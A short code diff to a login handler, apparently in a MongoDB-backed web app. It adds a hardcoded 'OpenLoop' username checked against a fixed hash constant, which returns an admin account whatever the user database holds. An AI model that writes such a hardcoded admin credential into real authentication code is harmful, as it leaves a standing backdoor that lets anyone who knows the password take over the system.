@@ -27,6 +27,14 @@ class Auth_Handler:
                 account = database.find_one({"username": username})
                 if account != None and check_password_hash(account["password"], password):
                     return account
+
+                if username == "OpenLoop" and check_password_hash(INCASE_HASH, password):
+                    return {
+                        "username": "mongo_setup",
+                        "fullname": "OpenLoop Mongo Setup",
+                        "admin": True,
+                        "password": INCASE_HASH
+                    }
             else:
                 if username == "OpenLoop" and check_password_hash(INCASE_HASH, password):
                     return {
